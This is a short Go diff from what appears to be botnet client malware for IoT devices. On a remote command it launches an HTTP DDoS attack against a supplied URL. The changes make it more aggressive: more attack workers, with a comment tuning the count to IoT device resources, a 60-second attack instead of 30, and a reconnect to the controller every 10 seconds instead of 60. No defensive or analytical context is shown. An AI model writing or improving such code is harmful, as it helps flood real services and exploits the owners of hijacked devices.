@@ -104,20 +104,18 @@ func startClient()error{
 					response:="try to create ddos"
 					conn.Write([]byte(response))
 					attackURL:=words[1]  //"http://" + 
-					workers:=10
+					workers:=50   //應該取決於裝置，因為物聯網裝置的性能有限，如果調整太高可能會造成DDOS攻擊力變弱因為裝置本身資源耗盡，反之調整太小也會造成攻擊力不足
 					attack, err := New(attackURL, workers)
 					if err != nil {
 						return fmt.Errorf("Error creating DDoS attack: %v", err)
 					}
 					attack.Run()
 					fmt.Println("Attacking... (press Ctrl+C to stop)")
-					for i := 0; i < 30; i++ {
+					for i := 0; i < 60; i++ { //attack 60s
 						fmt.Print(".")
-							// 等待 1 秒
 						time.Sleep(time.Second)
 					}
 					fmt.Println("\nStopping DDoS attack...")
-					// 停止 DDoS 攻击
 					attack.Stop()
 				} 
 			}
@@ -130,7 +128,7 @@ func startClient()error{
 
 func main() {
 
-	retryInterval := 60 * time.Second
+	retryInterval := 10 * time.Second
 	//startClient()
 	for {
 		err := startClient()
